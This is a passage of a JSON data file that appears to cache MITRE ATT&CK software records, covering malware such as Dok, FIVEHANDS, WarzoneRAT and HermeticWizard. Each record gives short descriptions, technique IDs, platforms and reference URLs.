        "T1561.001",
        "T1027.009",
        "T1485",
        "T1036.004",
        "T1027.013",
        "T1569.002",
        "T1140",
        "T1124",
        "T1531",
        "T1561.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1134",
      "stix_id": "malware--f2e6af17-3828-4f10-88e7-343591618ddb",
      "created": "2024-05-22T21:27:28.050000+00:00",
      "modified": "2024-08-26T18:34:46.859000+00:00"
    },
    "S0026": {
      "id": "S0026",
      "name": "GLOOXMAIL",
      "description": "[GLOOXMAIL](https://attack.mitre.org/software/S0026) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Jabber/XMPP traffic. (Citation: Mandiant APT1)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.005",
        "T1102.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0026",
      "stix_id": "malware--f2e8c7a1-cae1-45c4-baf0-6f21bdcbb2c2",
      "created": "2017-05-31T21:32:20.526000+00:00",
      "modified": "2024-08-28T14:16:00.884000+00:00"
    },
    "S0281": {
      "id": "S0281",
      "name": "Dok",
      "description": "[Dok](https://attack.mitre.org/software/S0281) is a Trojan application disguised as a .zip file that is able to collect user credentials and install a malicious proxy server to redirect a user's network traffic (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)).(Citation: objsee mac malware 2017)(Citation: hexed osx.dok analysis 2019)(Citation: CheckPoint Dok)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1557",
        "T1027.002",
        "T1543.001",
        "T1059.002",
        "T1222.002",
        "T1048.003",
        "T1553.004",
        "T1548.003",
        "T1056.002",
        "T1090.003",
        "T1547.015"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0281",
      "stix_id": "malware--f36b2598-515f-4345-84e5-5ccde253edbe",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-11-17T17:15:10.558000+00:00"
    },
    "S0579": {
      "id": "S0579",
      "name": "Waterbear",
      "description": "[Waterbear](https://attack.mitre.org/software/S0579) is modular malware attributed to [BlackTech](https://attack.mitre.org/groups/G0098) that has been used primarily for lateral movement, decrypting, and triggering payloads and is capable of hiding network behaviors.(Citation: Trend Micro Waterbear December 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1574.001",
        "T1055.003",
        "T1055",
        "T1105",
        "T1112",
        "T1140",
        "T1027.013",
        "T1049",
        "T1012",
        "T1518.001",
        "T1057",
        "T1562.006",
        "T1106",
        "T1027.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0579",
      "stix_id": "malware--f3f1fbed-7e29-49cb-8579-4a378f858deb",
      "created": "2021-02-22T16:35:33.673000+00:00",
      "modified": "2024-04-10T22:14:28.440000+00:00"
    },
    "S0618": {
      "id": "S0618",
      "name": "FIVEHANDS",
      "description": "[FIVEHANDS](https://attack.mitre.org/software/S0618) is a customized version of [DEATHRANSOM](https://attack.mitre.org/software/S0616) ransomware written in C++. [FIVEHANDS](https://attack.mitre.org/software/S0618) has been used since at least 2021, including in Ransomware-as-a-Service (RaaS) campaigns, sometimes along with [SombRAT](https://attack.mitre.org/software/S0615).(Citation: FireEye FiveHands April 2021)(Citation: NCC Group Fivehands June 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1047",
        "T1059",
        "T1135",
        "T1083",
        "T1486",
        "T1490",
        "T1140",
        "T1027.013"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0618",
      "stix_id": "malware--f464354c-7103-47c6-969b-8766f0157ed2",
      "created": "2021-06-04T15:34:01.097000+00:00",
      "modified": "2024-04-11T02:33:06.963000+00:00"
    },
    "S0244": {
      "id": "S0244",
      "name": "Comnie",
      "description": "[Comnie](https://attack.mitre.org/software/S0244) is a remote backdoor which has been used in attacks in East Asia. (Citation: Palo Alto Comnie)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1007",
        "T1119",
        "T1518.001",
        "T1059.003",
        "T1102.002",
        "T1057",
        "T1016",
        "T1087.001",
        "T1049",
        "T1018",
        "T1547.009",
        "T1071.001",
        "T1059.005",
        "T1573.001",
        "T1082",
        "T1218.011",
        "T1547.001",
        "T1027.001",
        "T1027"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0244",
      "stix_id": "malware--f4c80d39-ce10-4f74-9b50-a7e3f5df1f2e",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:04.669000+00:00"
    },
    "S0207": {
      "id": "S0207",
      "name": "Vasport",
      "description": "[Vasport](https://attack.mitre.org/software/S0207) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Vasport May 2012)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1105",
        "T1547.001",
        "T1090"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0207",
      "stix_id": "malware--f4d8a2d6-c684-453a-8a14-cf4a94f755c5",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T19:55:07.593000+00:00"
    },
    "S0129": {
      "id": "S0129",
      "name": "AutoIt backdoor",
      "description": "[AutoIt backdoor](https://attack.mitre.org/software/S0129) is malware that has been used by the actors responsible for the MONSOON campaign. The actors frequently used it in weaponized .pps files exploiting CVE-2014-6352. (Citation: Forcepoint Monsoon) This malware makes use of the legitimate scripting language for Windows GUI automation with the same name.",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1548.002",
        "T1132.001",
        "T1059.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0129",
      "stix_id": "malware--f5352566-1a64-49ac-8f7f-97e1d1a03300",
      "created": "2017-05-31T21:33:14.551000+00:00",
      "modified": "2025-04-25T14:45:05.203000+00:00"
    },
    "S0648": {
      "id": "S0648",
      "name": "JSS Loader",
      "description": "[JSS Loader](https://attack.mitre.org/software/S0648) is Remote Access Trojan (RAT) with .NET and C++ variants that has been used by [FIN7](https://attack.mitre.org/groups/G0046) since at least 2020.(Citation: eSentire FIN7 July 2021)(Citation: CrowdStrike Carbon Spider August 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.005",
        "T1059.005",
        "T1059.007",
        "T1566.001",
        "T1105",
        "T1204.002",
        "T1059.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0648",
      "stix_id": "malware--f559f945-eb8b-48b1-904c-68568deebed3",
      "created": "2021-09-22T14:44:48.087000+00:00",
      "modified": "2025-04-25T14:45:05.560000+00:00"
    },
    "S0158": {
      "id": "S0158",
      "name": "PHOREAL",
      "description": "[PHOREAL](https://attack.mitre.org/software/S0158) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1112",
        "T1059.003",
        "T1095"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0158",
      "stix_id": "malware--f6ae7a52-f3b6-4525-9daf-640c083f006e",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-25T14:45:05.924000+00:00"
    },
    "S0165": {
      "id": "S0165",
      "name": "OSInfo",
      "description": "[OSInfo](https://attack.mitre.org/software/S0165) is a custom tool used by [APT3](https://attack.mitre.org/groups/G0022) to do internal discovery on a victim's computer and network. (Citation: Symantec Buckeye)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1087.001",
        "T1012",
        "T1082",
        "T1049",
        "T1018",
        "T1069.002",
        "T1087.002",
        "T1069.001",
        "T1135",
        "T1016"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0165",
      "stix_id": "malware--f6d1d2cb-12f5-4221-9636-44606ea1f3f8",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:45:06.283000+00:00"
    },
    "S0282": {
      "id": "S0282",
      "name": "MacSpy",
      "description": "[MacSpy](https://attack.mitre.org/software/S0282) is a malware-as-a-service offered on the darkweb  (Citation: objsee mac malware 2017).",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1090.003",
        "T1071.001",
        "T1543.001",
        "T1115",
        "T1564.001",
        "T1123",
        "T1113",
        "T1056.001"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0282",
      "stix_id": "malware--f72251cb-2be5-421f-a081-99c29a1209e7",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:06.639000+00:00"
    },
    "S0681": {
      "id": "S0681",
      "name": "Lizar",
      "description": "[Lizar](https://attack.mitre.org/software/S0681) is a modular remote access tool written using the .NET Framework that shares structural similarities to [Carbanak](https://attack.mitre.org/software/S0030). It has likely been used by [FIN7](https://attack.mitre.org/groups/G0046) since at least February 2021.(Citation: BiZone Lizar May 2021)(Citation: Threatpost Lizar May 2021)(Citation: Gemini FIN7 Oct 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055",
        "T1059.003",
        "T1217",
        "T1055.001",
        "T1106",
        "T1003.001",
        "T1555.004",
        "T1113",
        "T1033",
        "T1140",
        "T1059.001",
        "T1055.002",
        "T1105",
        "T1087.003",
        "T1082",
        "T1518.001",
        "T1555.003",
        "T1573",
        "T1016",
        "T1057",
        "T1560",
        "T1049"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0681",
      "stix_id": "malware--f74a5069-015d-4404-83ad-5ca01056c0dc",
      "created": "2022-02-02T21:05:48.601000+00:00",
      "modified": "2025-04-16T20:38:44.147000+00:00"
    },
    "S0567": {
      "id": "S0567",
      "name": "Dtrack",
      "description": "[Dtrack](https://attack.mitre.org/software/S0567) is spyware that was discovered in 2019 and has been used against Indian financial institutions, research facilities, and the Kudankulam Nuclear Power Plant. [Dtrack](https://attack.mitre.org/software/S0567) shares similarities with the DarkSeoul campaign, which was attributed to [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: Kaspersky Dtrack)(Citation: Securelist Dtrack)(Citation: Dragos WASSONITE)(Citation: CyberBit Dtrack)(Citation: ZDNet Dtrack)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1005",
        "T1074.001",
        "T1082",
        "T1574",
        "T1056.001",
        "T1547",
        "T1543.003",
        "T1059.003",
        "T1078",
        "T1070.004",
        "T1217",
        "T1036.005",
        "T1049",
        "T1027.009",
        "T1012",
        "T1055.012",
        "T1083",
        "T1016",
        "T1057",
        "T1560",
        "T1129",
        "T1105",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0567",
      "stix_id": "malware--f8774023-8021-4ece-9aca-383ac89d2759",
      "created": "2021-01-25T13:58:24.977000+00:00",
      "modified": "2025-04-16T20:38:44.292000+00:00"
    },
    "S0132": {
      "id": "S0132",
      "name": "H1N1",
      "description": "[H1N1](https://attack.mitre.org/software/S0132) is a malware variant that has been distributed via a campaign using VBA macros to infect victims. Although it initially had only loader capabilities, it has evolved to include information-stealing functionality. (Citation: Cisco H1N1 Part 1)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1555.003",
        "T1562.001",
        "T1080",
        "T1490",
        "T1562.004",
        "T1027",
        "T1059.003",
        "T1091",
        "T1548.002",
        "T1027.002",
        "T1105",
        "T1132",
        "T1573.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0132",
      "stix_id": "malware--f8dfbc54-b070-4224-b560-79aaa5f835bd",
      "created": "2017-05-31T21:33:15.910000+00:00",
      "modified": "2025-04-25T14:45:07.358000+00:00"
    },
    "S1104": {
      "id": "S1104",
      "name": "SLOWPULSE",
      "description": "[SLOWPULSE](https://attack.mitre.org/software/S1104) is a malware that was used by [APT5](https://attack.mitre.org/groups/G1023) as early as 2020 including against U.S. Defense Industrial Base (DIB) companies. [SLOWPULSE](https://attack.mitre.org/software/S1104) has several variants and can modify legitimate Pulse Secure VPN files in order to log credentials and bypass single and two-factor authentication flows.(Citation: Mandiant Pulse Secure Zero-Day April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1556.004",
        "T1111",
        "T1556.006",
        "T1074.001",
        "T1554",
        "T1027"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1104",
      "stix_id": "malware--f8fc98ac-ad6d-44db-b6e2-f0c6eb4eace4",
      "created": "2024-02-06T21:07:39.125000+00:00",
      "modified": "2025-04-15T19:46:35.817000+00:00"
    },
    "S0639": {
      "id": "S0639",
      "name": "Seth-Locker",
      "description": "[Seth-Locker](https://attack.mitre.org/software/S0639) is a ransomware with some remote control capabilities that has been in use since at least 2021.\n(Citation: Trend Micro Ransomware February 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1105",
        "T1486"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0639",
      "stix_id": "malware--f931a0b9-0361-4b1b-bacf-955062c35746",
      "created": "2021-08-13T14:57:39.387000+00:00",
      "modified": "2025-04-25T14:45:07.890000+00:00"
    },
    "S0451": {
      "id": "S0451",
      "name": "LoudMiner",
      "description": "[LoudMiner](https://attack.mitre.org/software/S0451) is a cryptocurrency miner which uses virtualization software to siphon system resources. The miner has been bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.(Citation: ESET LoudMiner June 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1569.001",
        "T1027.010",
        "T1027.013",
        "T1564.001",
        "T1059.004",
        "T1543.004",
        "T1496.001",
        "T1543.003",
        "T1189",
        "T1016",
        "T1105",
        "T1569.002",
        "T1070.004",
        "T1082",
        "T1564.006",
        "T1218.007",
        "T1059.003"
      ],
      "platforms": [
        "macOS",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0451",
      "stix_id": "malware--f99f3dcc-683f-4936-8791-075ac5e58f10",
      "created": "2020-05-18T21:01:51.045000+00:00",
      "modified": "2024-04-11T01:36:42.906000+00:00"
    },
    "S0344": {
      "id": "S0344",
      "name": "Azorult",
      "description": "[Azorult](https://attack.mitre.org/software/S0344) is a commercial Trojan that is used to steal information from compromised hosts. [Azorult](https://attack.mitre.org/software/S0344) has been observed in the wild as early as 2016.\nIn July 2018, [Azorult](https://attack.mitre.org/software/S0344) was seen used in a spearphishing campaign against targets in North America. [Azorult](https://attack.mitre.org/software/S0344) has been seen used for cryptocurrency theft. (Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1134.002",
        "T1070.004",
        "T1573.001",
        "T1033",
        "T1055.012",
        "T1012",
        "T1140",
        "T1552.001",
        "T1555.003",
        "T1105",
        "T1124",
        "T1016",
        "T1083",
        "T1082",
        "T1113",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0344",
      "stix_id": "malware--f9b05f33-d45d-4e4d-aafe-c208d38a0080",
      "created": "2019-01-30T15:19:14.309000+00:00",
      "modified": "2025-04-16T20:38:44.780000+00:00"
    },
    "S0570": {
      "id": "S0570",
      "name": "BitPaymer",
      "description": "[BitPaymer](https://attack.mitre.org/software/S0570) is a ransomware variant first observed in August 2017 targeting hospitals in the U.K. [BitPaymer](https://attack.mitre.org/software/S0570) uses a unique encryption key, ransom note, and contact information for each operation. [BitPaymer](https://attack.mitre.org/software/S0570) has several indicators suggesting overlap with the [Dridex](https://attack.mitre.org/software/S0384) malware and is often delivered via [Dridex](https://attack.mitre.org/software/S0384).(Citation: Crowdstrike Indrik November 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1018",
        "T1480",
        "T1222.001",
        "T1486",
        "T1027.013",
        "T1070.006",
        "T1547.001",
        "T1135",
        "T1134.001",
        "T1012",
        "T1490",
        "T1543.003",
        "T1548.002",
        "T1564.004",
        "T1007",
        "T1087.001",
        "T1112",
        "T1106"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0570",
      "stix_id": "malware--fa766a65-5136-4ff3-8429-36d08eaa0100",
      "created": "2021-02-08T22:19:19.340000+00:00",
      "modified": "2024-04-11T02:52:57.879000+00:00"
    },
    "S0031": {
      "id": "S0031",
      "name": "BACKSPACE",
      "description": "[BACKSPACE](https://attack.mitre.org/software/S0031) is a backdoor used by [APT30](https://attack.mitre.org/groups/G0013) that dates back to at least 2005. (Citation: FireEye APT30)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1112",
        "T1059.003",
        "T1012",
        "T1071.001",
        "T1057",
        "T1132.002",
        "T1090.001",
        "T1547.001",
        "T1041",
        "T1083",
        "T1104",
        "T1547.009",
        "T1562.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0031",
      "stix_id": "malware--fb261c56-b80e-43a9-8351-c84081e7213d",
      "created": "2017-05-31T21:32:24.428000+00:00",
      "modified": "2024-11-17T15:05:25.109000+00:00"
    },
    "S0672": {
      "id": "S0672",
      "name": "Zox",
      "description": "[Zox](https://attack.mitre.org/software/S0672) is a remote access tool that has been used by [Axiom](https://attack.mitre.org/groups/G0001) since at least 2008.(Citation: Novetta-Axiom)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013",
        "T1001.002",
        "T1105",
        "T1083",
        "T1021.002",
        "T1005",
        "T1057",
        "T1068",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0672",
      "stix_id": "malware--fb28627c-d6ea-4c35-b138-ab5e96ae5445",
      "created": "2022-01-09T22:02:05.615000+00:00",
      "modified": "2024-04-10T20:30:02.520000+00:00"
    },
    "S0275": {
      "id": "S0275",
      "name": "UPPERCUT",
      "description": "[UPPERCUT](https://attack.mitre.org/software/S0275) is a backdoor that has been used by [menuPass](https://attack.mitre.org/groups/G0045). (Citation: FireEye APT10 Sept 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1124",
        "T1033",
        "T1059.003",
        "T1113",
        "T1573.001",
        "T1016",
        "T1082",
        "T1105",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0275",
      "stix_id": "malware--fb4e3792-e915-4fdd-a9cd-92dfa2ace7aa",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:09.125000+00:00"
    },
    "S0045": {
      "id": "S0045",
      "name": "ADVSTORESHELL",
      "description": "[ADVSTORESHELL](https://attack.mitre.org/software/S0045) is a spying backdoor that has been used by [APT28](https://attack.mitre.org/groups/G0007) from at least 2012 to 2016. It is generally used for long-term espionage and is deployed on targets deemed interesting after a reconnaissance phase. (Citation: Kaspersky Sofacy) (Citation: ESET Sednit Part 2)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1546.015",
        "T1082",
        "T1056.001",
        "T1132.001",
        "T1218.011",
        "T1547.001",
        "T1560",
        "T1070.004",
        "T1074.001",
        "T1029",
        "T1057",
        "T1059.003",
        "T1083",
        "T1573.001",
        "T1071.001",
        "T1012",
        "T1120",
        "T1112",
        "T1027",
        "T1560.003",
        "T1106",
        "T1573.002",
        "T1041"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0045",
      "stix_id": "malware--fb575479-14ef-41e9-bfab-0b7cf10bec73",
      "created": "2017-05-31T21:32:34.648000+00:00",
      "modified": "2025-04-25T14:45:09.488000+00:00"
    },
    "S1034": {
      "id": "S1034",
      "name": "StrifeWater",
      "description": "[StrifeWater](https://attack.mitre.org/software/S1034) is a remote-access tool that has been used by [Moses Staff](https://attack.mitre.org/groups/G1009) in the initial stages of their attacks since at least November 2021.(Citation: Cybereason StrifeWater Feb 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1053",
        "T1059.003",
        "T1106",
        "T1573.001",
        "T1113",
        "T1036.005",
        "T1497.003",
        "T1041",
        "T1124",
        "T1082",
        "T1083",
        "T1005",
        "T1105",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1034",
      "stix_id": "malware--fb78294a-7d7a-4d38-8ad0-92e67fddc9f0",
      "created": "2022-08-15T16:31:56.856000+00:00",
      "modified": "2025-04-16T20:38:45.234000+00:00"
    },
    "S0080": {
      "id": "S0080",
      "name": "Mivast",
      "description": "[Mivast](https://attack.mitre.org/software/S0080) is a backdoor that has been used by [Deep Panda](https://attack.mitre.org/groups/G0009). It was reportedly used in the Anthem breach. (Citation: Symantec Black Vine)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1003.002",
        "T1105",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0080",
      "stix_id": "malware--fbb470da-1d44-4f29-bbb3-9efbe20f94a3",
      "created": "2017-05-31T21:32:54.044000+00:00",
      "modified": "2025-04-16T20:38:45.394000+00:00"
    },
    "S0394": {
      "id": "S0394",
      "name": "HiddenWasp",
      "description": "[HiddenWasp](https://attack.mitre.org/software/S0394) is a Linux-based Trojan used to target systems for remote control. It comes in the form of a statically linked ELF binary with stdlibc++.(Citation: Intezer HiddenWasp Map 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1136.001",
        "T1095",
        "T1574.006",
        "T1573.001",
        "T1037.004",
        "T1014",
        "T1059.003",
        "T1140",
        "T1105",
        "T1027.013"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0394",
      "stix_id": "malware--fc774af4-533b-4724-96d2-ac1026316794",
      "created": "2019-06-24T12:04:32.323000+00:00",
      "modified": "2024-04-11T02:19:50.306000+00:00"
    },
    "S0670": {
      "id": "S0670",
      "name": "WarzoneRAT",
      "description": "[WarzoneRAT](https://attack.mitre.org/software/S0670) is a malware-as-a-service remote access tool (RAT) written in C++ that has been publicly available for purchase since at least late 2018.(Citation: Check Point Warzone Feb 2020)(Citation: Uptycs Warzone UAC Bypass November 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1056.001",
        "T1547.001",
        "T1204.002",
        "T1041",
        "T1555.003",
        "T1548.002",
        "T1005",
        "T1105",
        "T1082",
        "T1090",
        "T1573.001",
        "T1021.001",
        "T1112",
        "T1562.001",
        "T1546.015",
        "T1564",
        "T1566.001",
        "T1140",
        "T1059.001",
        "T1106",
        "T1125",
        "T1564.003",
        "T1055",
        "T1059.003",
        "T1021.005",
        "T1221",
        "T1095",
        "T1083",
        "T1014"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0670",
      "stix_id": "malware--fde19a18-e502-467f-be14-58c71b4e7f4b",
      "created": "2021-12-27T17:21:18.652000+00:00",
      "modified": "2023-10-03T19:33:26.976000+00:00"
    },
    "S0056": {
      "id": "S0056",
      "name": "Net Crawler",
      "description": "[Net Crawler](https://attack.mitre.org/software/S0056) is an intranet worm capable of extracting credentials using credential dumpers and spreading to systems on a network over SMB by brute forcing accounts with recovered passwords and using [PsExec](https://attack.mitre.org/software/S0029) to execute a copy of [Net Crawler](https://attack.mitre.org/software/S0056). (Citation: Cylance Cleaver)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1110.002",
        "T1569.002",
        "T1003.001",
        "T1021.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0056",
      "stix_id": "malware--fde50aaa-f5de-4cb8-989a-babb57d6a704",
      "created": "2017-05-31T21:32:38.851000+00:00",
      "modified": "2025-04-16T20:38:45.551000+00:00"
    },
    "S0533": {
      "id": "S0533",
      "name": "SLOTHFULMEDIA",
      "description": "[SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) is a remote access Trojan written in C++ that has been used by an unidentified \"sophisticated cyber actor\" since at least January 2017.(Citation: CISA MAR SLOTHFULMEDIA October 2020)(Citation: Costin Raiu IAmTheKing October 2020) It has been used to target government organizations, defense contractors, universities, and energy companies in Russia, India, Kazakhstan, Kyrgyzstan, Malaysia, Ukraine, and Eastern Europe.(Citation: USCYBERCOM SLOTHFULMEDIA October 2020)(Citation: Kaspersky IAmTheKing October 2020)  \n\nIn October 2020, Kaspersky Labs assessed [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) is part of an activity cluster it refers to as \"IAmTheKing\".(Citation: Kaspersky IAmTheKing October 2020) ESET also noted code similarity between [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) and droppers used by a group it refers to as \"PowerPool\".(Citation: ESET PowerPool Code October 2020) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1041",
        "T1036.005",
        "T1112",
        "T1055",
        "T1071.001",
        "T1007",
        "T1056.001",
        "T1059.003",
        "T1033",
        "T1543.003",
        "T1036.004",
        "T1569.002",
        "T1005",
        "T1001",
        "T1083",
        "T1489",
        "T1070.004",
        "T1105",
        "T1049",
        "T1057",
        "T1113",
        "T1564.001",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0533",
      "stix_id": "malware--feb2d7bb-aacb-48df-ad04-ccf41a30cd90",
      "created": "2020-11-16T23:23:00.729000+00:00",
      "modified": "2024-09-12T19:39:44.514000+00:00"
    },
    "S0181": {
      "id": "S0181",
      "name": "FALLCHILL",
      "description": "[FALLCHILL](https://attack.mitre.org/software/S0181) is a RAT that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least 2016 to target the aerospace, telecommunications, and finance industries. It is usually dropped by other [Lazarus Group](https://attack.mitre.org/groups/G0032) malware or delivered when a victim unknowingly visits a compromised website. (Citation: US-CERT FALLCHILL Nov 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1070.006",
        "T1573.001",
        "T1070.004",
        "T1082",
        "T1016",
        "T1543.003",
        "T1001.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0181",
      "stix_id": "malware--fece06b7-d4b1-42cf-b81a-5323c917546e",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:45:10.924000+00:00"
    },
    "S1035": {
      "id": "S1035",
      "name": "Small Sieve",
      "description": "[Small Sieve](https://attack.mitre.org/software/S1035) is a Telegram Bot API-based Python backdoor that has been distributed using a Nullsoft Scriptable Install System (NSIS) Installer; it has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least January 2022.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: NCSC GCHQ Small Sieve Jan 2022)\n\nSecurity researchers have also noted [Small Sieve](https://attack.mitre.org/software/S1035)'s use by UNC3313, which may be associated with [MuddyWater](https://attack.mitre.org/groups/G0069).(Citation: Mandiant UNC3313 Feb 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1105",
        "T1132.002",
        "T1480",
        "T1016",
        "T1573.002",
        "T1059.006",
        "T1547.001",
        "T1036.005",
        "T1027",
        "T1033",
        "T1102.002",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1035",
      "stix_id": "malware--ff41b9b6-4c1d-407b-a7e2-835109c8dbc5",
      "created": "2022-08-16T19:16:48.398000+00:00",
      "modified": "2025-04-16T20:38:45.865000+00:00"
    },
    "S0143": {
      "id": "S0143",
      "name": "Flame",
      "description": "[Flame](https://attack.mitre.org/software/S0143) is a sophisticated toolkit that has been used to collect information since at least 2010, largely targeting Middle East countries. (Citation: Kaspersky Flame)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1091",
        "T1210",
        "T1123",
        "T1011.001",
        "T1036.010",
        "T1518.001",
        "T1136.001",
        "T1113",
        "T1547.002",
        "T1218.011"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0143",
      "stix_id": "malware--ff6840c9-4c87-4d07-bbb6-9f50aa33d498",
      "created": "2017-05-31T21:33:21.973000+00:00",
      "modified": "2025-04-16T20:38:46.014000+00:00"
    },
    "S0698": {
      "id": "S0698",
      "name": "HermeticWizard",
      "description": "[HermeticWizard](https://attack.mitre.org/software/S0698) is a worm that has been used to spread [HermeticWiper](https://attack.mitre.org/software/S0697) in attacks against organizations in Ukraine since at least 2022.(Citation: ESET Hermetic Wizard March 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1021.002",
        "T1059.003",
        "T1553.002",
        "T1569.002",
        "T1036.005",
        "T1070.001",
        "T1110.001",
        "T1106",
        "T1018",
        "T1047",
        "T1046",
        "T1570",
        "T1218.010",
        "T1559.001",
        "T1027.013",
        "T1218.011"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0698",
      "stix_id": "malware--ff7ed9c1-dca3-4e62-9da6-72c5d388b8fa",
      "created": "2022-03-25T20:47:06.942000+00:00",
      "modified": "2024-04-11T02:21:28.830000+00:00"
    }
  },
  "cache_timestamp": "2024-01-01T00:00:00Z"
}